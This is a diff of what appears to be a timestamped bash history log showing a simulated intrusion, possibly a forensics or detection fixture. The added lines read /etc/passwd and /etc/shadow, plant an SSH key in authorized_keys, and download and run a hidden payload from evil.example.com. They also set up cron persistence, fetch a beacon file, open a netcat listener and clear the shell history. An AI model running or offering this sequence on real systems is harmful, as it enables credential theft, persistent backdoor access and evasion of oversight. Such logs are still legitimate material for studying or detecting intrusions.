@@ -3,8 +3,24 @@ ls -la /etc
 #1764000010
 cat /etc/passwd
 #1764000020
-echo "ssh-rsa AAAA..." >> /home/yushin/.ssh/authorized_keys
+cat /etc/shadow
 #1764000030
-curl http://evil.com/payload.sh | bash
-#1764000040
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDX..." >> /home/yushin/.ssh/authorized_keys
+#1764000035
+chmod 600 /home/yushin/.ssh/authorized_keys
+#1764000050
+curl -sSL http://evil.example.com/payload.sh -o /tmp/.x
+#1764000051
+chmod +x /tmp/.x
+#1764000052
+nohup /tmp/.x > /dev/null 2>&1 &
+#1764000080
+crontab -l
+#1764000085
+(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.x") | crontab -
+#1764000100
+wget http://evil.example.com/.beacon -O /var/tmp/.b
+#1764000120
+nc -lvnp 4444
+#1764000150
 history -c
